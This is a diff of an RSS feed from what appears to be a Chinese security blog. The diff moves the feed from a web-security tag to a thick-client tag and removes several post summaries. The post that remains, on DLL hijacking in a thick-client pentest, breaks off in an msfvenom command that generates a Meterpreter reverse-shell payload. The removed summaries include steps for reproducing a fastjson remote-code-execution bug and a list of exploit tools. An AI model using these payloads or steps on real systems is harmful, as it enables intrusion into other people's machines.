@@ -1,12 +1,12 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>web安全 on Olist.213</title>
-    <link>https://olist213.github.io/tags/web%E5%AE%89%E5%85%A8/</link>
-    <description>Recent content in web安全 on Olist.213</description>
+    <title>胖客户端 on Olist.213</title>
+    <link>https://olist213.github.io/tags/%E8%83%96%E5%AE%A2%E6%88%B7%E7%AB%AF/</link>
+    <description>Recent content in 胖客户端 on Olist.213</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Sat, 01 Apr 2023 23:13:41 +0800</lastBuildDate><atom:link href="https://olist213.github.io/tags/web%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 01 Apr 2023 23:13:41 +0800</lastBuildDate><atom:link href="https://olist213.github.io/tags/%E8%83%96%E5%AE%A2%E6%88%B7%E7%AB%AF/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>记一次胖客户端程序渗透测试</title>
       <link>https://olist213.github.io/posts/thick_client_penetration_testing/</link>
@@ -42,67 +42,6 @@ dll劫持利用的第一步是获取可利用的dll文件。
 操作系统按照上述顺序在指定的目录和文件中查找 DLL 文件，并将它们加载到应用程序中。
 了解了dll加载顺序，并且找到了dll文件，那么就可以开始构造恶意的dll文件了，通过metasploit框架来进行构造。
 msfvenom -p windows/meterpreter/reverse_tcp LHOST= 192.</description>
-    </item>
-    
-    <item>
-      <title>一些工具(updating)</title>
-      <link>https://olist213.github.io/posts/tools_resoure/</link>
-      <pubDate>Sat, 01 Apr 2023 14:01:34 +0800</pubDate>
-      
-      <guid>https://olist213.github.io/posts/tools_resoure/</guid>
-      <description>   工具名称 工具链接 工具描述 更新时间     Fastjson 扫描器 https://github.com/a1phaboy/FastjsonScan fastjson扫描 无   FastjsonPatrol https://github.com/ce-automne/FastjsonPatrol 一款探测fastjson漏洞的BurpSuite插件 2022.4.1   Log4j2Scan https://github.com/whwlsfb/Log4j2Scan Log4j2 burpsuite被动扫描插件 2022.10.21   SpringBootExploit https://github.com/0x727/SpringBootExploit springboot漏洞利用工具 2022.4.17    </description>
-    </item>
-    
-    <item>
-      <title>fastjson 80远程代码执行漏洞复现</title>
-      <link>https://olist213.github.io/posts/fastjson_80_rce/</link>
-      <pubDate>Wed, 29 Mar 2023 15:59:44 +0800</pubDate>
-      
-      <guid>https://olist213.github.io/posts/fastjson_80_rce/</guid>
-      <description>项目地址 GitHub - Lonely-night/fastjsonVul at 7f9d2d8ea1c27ae1f9c06076849ae76c25b6aff7
-利用条件  fastjson版本： 1.2.76 &amp;lt;= fastjson &amp;lt; 1.2.83 存在groovy依赖  复现步骤 1、编译attack模块为attack-1.jar包
-2、在attack-1.jar包所在的目录下执行启用http服务。
-python -m SimpleHTTPServer 8433
-3、运行poc
-利用idea重新打开项目，项目路径：
-jdk版本切换成1.8
-打开poc.java文件，这个文件是漏洞验证的payload。
-右键运行
-成功运行payload</description>
-    </item>
-    
-    <item>
-      <title>网页篡改漏洞描述</title>
-      <link>https://olist213.github.io/posts/web_page_tampering/</link>
-      <pubDate>Thu, 14 Feb 2019 11:21:08 +0800</pubDate>
-      
-      <guid>https://olist213.github.io/posts/web_page_tampering/</guid>
-      <description>网页篡改 风险等级:高危漏洞描述
-针对网站程序漏洞，植入木马 (webshell、跨站脚本攻击)，篡改网页，添加黑链或者嵌入非本站信息，甚至是创建恶意网页，通常为博彩、私服篡改居多。
-漏洞危害
-网站已被恶意攻击者控制，浏览器提示非法网站，不予访问，对网站自身形象不利。
-解决建议
-1、对服务器进行木马查杀，看是否存在被恶意控制的脚本，对网站进行测试，发现应用存在的缺陷。
-2、删除恶意的篡改内容
-3、通过申诉，更新快照。
-4、部署网页防篡改保护系统
-5、通过在线7*24小时云平台进行挂马检测/网页木马检测/黑链检测，通过在线服务平台的挂马特征库（云监控平台自学习系统动态增加挂马特征），对网页的挂马 / 木马和页面特征进行分析，识别出挂马、木马和挂黑链等安全问题。
-6、服务器日常的运维过程中，定期通过杀毒软件对服务器进行扫描，定期更换服务器密码，定期删除过期的用户，及时更新操作系统的补丁。</description>
-    </item>
-    
-    <item>
-      <title>web漏洞描述与解决建议</title>
-      <link>https://olist213.github.io/posts/web_vulnerability_description/</link>
-      <pubDate>Fri, 25 Jan 2019 16:42:15 +0800</pubDate>
-      
-      <guid>https://olist213.github.io/posts/web_vulnerability_description/</guid>
-      <description>&lt;p&gt;[TOC]&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;内容均来自互联网，风险等级根据实际情况定义&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;通用建议&#34;&gt;通用建议&lt;/h2&gt;
-&lt;p&gt;1、建立和完善一套有效的安全管理制度，对网站的日常维护和使用进行规范。&lt;/p&gt;
-&lt;p&gt;2、定期对网站及应用系统进行全面安全检查，保障系统安全运行，如有条件，可聘请第三方专业安全服务公司协助进行。&lt;/p&gt;
-&lt;p&gt;3、定期对相关管理人员和技术人员进行安全培训，提高安全技术能力和实际操作能力。&lt;/p&gt;
-&lt;p&gt;4、采用专业的Web安全防护产品，可以在不修改网站本身的情况下对大多数的Web攻击起到有效的阻断作用。&lt;/p&gt;</description>
     </item>
     
   </channel>
